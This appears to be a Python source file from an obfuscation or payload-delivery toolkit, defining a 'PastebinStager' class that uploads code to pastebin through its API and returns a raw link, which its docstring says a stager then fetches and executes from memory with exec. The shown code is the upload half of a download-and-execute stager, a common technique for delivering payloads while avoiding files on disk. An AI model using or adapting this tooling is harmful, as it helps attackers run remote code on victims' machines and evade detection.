from urllib import parse, request

from pof.stager import DownloadStager


class PastebinStager(DownloadStager):
    """Pastebin.

    Code compatible with Python3 only (change in urllib names):

    Upload the code to pastebin, and generate a stager to pull the code and
    execute it (using `exec`) from memory.

    You will need to create an account on pastebin and get your API key to be
    able to upload to it.
    """

    def __init__(self, api_dev_key, *args, **kwargs) -> None:
        self.api_dev_key = api_dev_key
        super().__init__(*args, **kwargs)

    def upload(self, code):
        dumps_params = {
            "api_dev_key": self.api_dev_key,
            "api_paste_code": code,
            "api_option": "paste",
        }
        post_data = parse.urlencode(dumps_params).encode()
        req = request.Request("https://pastebin.com/api/api_post.php", data=post_data)
        r = request.urlopen(req)
        link = r.read().decode()
        return "https://pastebin.com/raw/" + link.split("/")[-1]
